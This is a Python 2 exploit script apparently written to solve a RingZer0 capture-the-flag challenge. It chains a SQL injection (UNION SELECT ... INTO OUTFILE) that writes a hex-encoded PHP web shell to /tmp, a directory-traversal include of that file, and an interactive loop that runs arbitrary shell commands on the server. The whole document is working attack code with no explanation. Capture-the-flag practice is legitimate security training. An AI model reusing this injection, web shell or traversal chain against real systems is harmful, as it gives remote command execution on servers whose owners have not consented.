import requests
import os
import sys

url = 'http://challenges.ringzer0team.com:20011/chal11.php'
sqli_param = 'author'
s = requests.Session()

# Prepare payload
file_hex = '0x3c3f7068702073657373696f6e5f737461727428293b6966202821697373657428245f53455353494f4e5b27636473275d2929207b245f53455353494f4e5b27636473275d203d20617272617928293b7d69662028737472706f7328245f4745545b27636d64275d2c20276364202729203d3d3d203029207b61727261795f7075736828245f53455353494f4e5b27636473275d2c20245f4745545b27636d64275d293b7d24636473203d2027273b666f726561636828245f53455353494f4e5b27636473275d2061732024636429207b24636473202b3d20246364202e20273b273b7d6563686f202741424361626331323344454664656634353647484967686937383927202e207368656c6c5f657865632824636473202e20245f4745545b27636d64275d2e2720323e26312729202e2027393837696867494847363534666564464544333231636261434241273b203f3e'
location = '/tmp/myGreatWebShell.php'
payload_upload = "z' UNION SELECT {file_hex},'','' INTO OUTFILE '{location}'#".format(file_hex=file_hex, location=location)

# Upload webshell
param = {sqli_param : payload_upload}
r = s.get(url, params=param)

# Connecting back
def get_result(output):
    prefix = 'ABCabc123DEFdef456GHIghi789'
    postfix = '987ihgIHG654fedFED321cbaCBA'
    iPre = output.find(prefix) + len(prefix)
    iPost = output.rfind(postfix)
    if iPost == -1 or iPre == len(prefix) - 1:
        print "The backdoor doesn't seem to be working accordingly..."
        raise KeyboardInterrupt
    
    return output[iPre:iPost]

webshell_path = '../../../../../../../../../..' + location
post_param = {'style' : webshell_path}
get_param = {'cmd' : None}

while True:
    get_param['cmd'] = 'pwd'
    r = s.post(url, data=post_param, params=get_param)
    pwd = get_result(r.text)
    
    sys.stdout.write(pwd[:-1] + '>')
    sys.stdout.flush()

    get_param['cmd'] = raw_input()
    r = s.post(url, data=post_param, params=get_param)
    result = get_result(r.text)
    print result

